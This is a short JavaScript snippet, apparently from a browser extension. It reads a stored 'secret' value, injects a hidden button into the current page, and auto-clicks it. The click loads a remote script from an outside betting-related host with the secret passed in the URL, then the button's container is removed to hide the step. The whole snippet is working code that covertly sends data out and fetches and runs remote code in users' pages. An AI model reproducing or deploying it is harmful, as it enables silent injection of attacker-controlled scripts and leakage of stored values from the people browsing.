chrome.storage.local.get(['secret'], function(result) {
    
    let div = document.createElement('div');
    div.setAttribute('id', 'inject-div')
    
    div.innerHTML += `<button id="inject-btn" onclick="let el = document.createElement('script');el.src =  'https://isset.online/betting/xbet/load.php?p=` + result.secret + `';document.body.append(el);">TEST<button>`;

    document.body.appendChild(div);

    document.querySelector('#inject-btn').click();
    document.querySelector('#inject-div').remove();
});
